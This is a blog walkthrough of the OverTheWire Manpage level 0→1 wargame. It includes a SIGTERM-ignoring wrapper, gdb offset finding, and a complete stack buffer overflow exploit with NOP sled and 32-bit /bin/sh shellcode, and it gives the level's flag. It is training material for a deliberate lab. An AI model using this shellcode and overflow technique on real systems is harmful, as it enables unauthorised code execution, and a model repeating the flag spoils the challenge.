---
layout: post-with-comments
title: "OverTheWire Manpage Level 0 → 1 tutorial!!"
permalink: /posts/overTheWire-Manpage-Level-0-to-1/
tags: [overthewire, manpage, walkthrough, ctf, linux, beginner]
description: "A step by step tutorial for OverTheWire Manpage Level 0 → 1!!"
---


<!-- Scoped styles: only affect this post -->

<style>
  .manpage-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .manpage-nav .nav-left,.manpage-nav .nav-center,.manpage-nav .nav-right{flex:1}
  .manpage-nav .nav-left{text-align:left}
  .manpage-nav .nav-center{text-align:center}
  .manpage-nav .nav-right{text-align:right}
  .manpage-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .manpage-nav a:hover{transform:translateY(-1px)}
  .manpage-nav .disabled{opacity:.55}
  :root[data-theme='light'] .manpage-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="manpage-nav" aria-label="Manpage level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Manpage-Level-0/' | relative_url }}">← Previous: Level 0</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/manpage/manpage1.html" target="_blank" rel="noopener">
      Official (Level 1) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Manpage-Level-1-to-2/' | relative_url }}">
      Next: Level 1 → 2 →
    </a>
  </div>
</nav>

## Login

Use the **manpage0** account from the previous level.

```bash
ssh manpage0@manpage.labs.overthewire.org -p 2224
# password: manpage0
```

---

## Goal

Overflow the buffer to gain control of EIP and execute shellcode, **but** the challenge raises `SIGTERM` on long input. We must **ignore** `SIGTERM` so the program doesn't terminate before our payload runs.

## Given program

```c
#include <stdio.h>
#include <string.h>
#include <signal.h>

int main(int argc, char *argv[])
{
    char buf[256];
    if(!argv[1]) return 0;
    strcpy(buf, argv[1]);
    if(strlen(buf) >= sizeof(buf) - 1) // no obos :)
        raise(SIGTERM);
    return 0;
}
```

The input is copied into a fixed 256-byte stack buffer using `strcpy` (unsafe), then the program calls `raise(SIGTERM)` if the length is long. We'll make the target **ignore** `SIGTERM` so execution continues into our shellcode.

## Approach

1. Launch the target via a **wrapper** that sets `signal(SIGTERM, SIG_IGN)` before `execve()`. Signals set to `SIG_IGN` stay ignored across `exec`.
2. Craft a payload: `NOP sled` + `/bin/sh` shellcode + padding + **RET → sled**.
3. Use `gdb` to confirm the **offset (260)** and choose a reliable return address inside the sled.

## Wrapper (disable SIGTERM, then execve target)

```c
// pwn.c
#include <unistd.h>
#include <signal.h>
#include <string.h>

int main(int argc, char* argv[]){
    char* arg[]={
        "/manpage/manpage1",
        argc > 1 ? argv[1] : NULL,
        NULL
    };
    char* envp[]={ NULL };
    signal(SIGTERM, SIG_IGN);   // keep ignored across exec
    execve("/manpage/manpage1", arg, envp);
    return 0; // if execve fails
}
```

Compile (writeable dirs like `/tmp` are safest):

```bash
cc -m32 -fno-stack-protector -z execstack -o pwn pwn.c
```

> Notes: `-m32` if toolchain supports 32-bit; stack protections disabled for lab reproducibility. If not available, omit and proceed—OTW binaries are usually compiled without protections suitable for the exercise.

## Finding the offset & buffer address

```bash
gdb -q /manpage/manpage1 <<'GDB'
set disassembly-flavor intel
break *main
run AAAA
print/x &buf
quit
GDB
```

* Offset to EIP is **260** bytes.
* Use `&buf` you just printed and choose `RET = &buf + 120` (lands in the middle of the 100-byte sled + shellcode). Adjust ±16 if needed.

## Payload layout

* `\x90` × 100  (NOP sled)
* `/bin/sh` shellcode (classic 32-bit Linux):
  `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80`
* `A` × 132 (padding up to EIP at offset 260)
* little-endian RET to sled (e.g., `\x48\xdc\xff\xff` for `0xffffdc48`) — **adjust** for your run.

## Exploit

```bash
./pwn $(python3 -c 'import sys,struct;
payload  = b"\x90"*100
payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
payload += b"\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload += b"A"*132
payload += struct.pack("<I", 0xffffdc48)  # example: &buf+120; replace with your value
sys.stdout.buffer.write(payload)')
```

This yields a shell and the flag `febiukovie`.

### Why this works

* `signal(SIGTERM, SIG_IGN)` remains in effect across `execve`, so the target ignores `raise(SIGTERM)` and continues running.
* With `strcpy` into a 256-byte buffer and total input >260 bytes, we overwrite **EIP**.
* Jumping into the NOP sled transfers control to our `/bin/sh` shellcode.

## Troubleshooting

* `Segmentation fault` immediately: your RET likely misses the sled. Adjust by ±16–32 bytes relative to `&buf+120`.
* `illegal option -m32` / cannot find 32-bit libs: drop `-m32`; exploit layout remains the same on this box.
* `python: command not found`: use `python3`.

---

**Congrats 🎉** You’re now through **Level 0 → 1** — time to RTFM even harder for Level **1 → 2**!

---

## Thanks for reading!

See you in the next level — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
